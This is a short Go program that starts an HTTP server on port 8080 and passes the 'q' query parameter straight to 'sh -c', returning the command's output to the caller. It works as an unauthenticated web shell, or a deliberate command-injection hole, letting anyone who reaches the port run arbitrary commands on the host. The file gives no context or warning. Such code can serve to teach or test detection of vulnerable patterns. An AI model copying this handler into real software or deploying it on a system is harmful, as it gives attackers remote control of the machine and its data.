package main

import (
	"fmt"
	"net/http"
	"os/exec"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		value := r.URL.Query().Get("q")
		out, err := exec.Command("sh", "-c", value).CombinedOutput()
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		fmt.Fprint(w, string(out))
	})
	_ = http.ListenAndServe(":8080", nil)
}
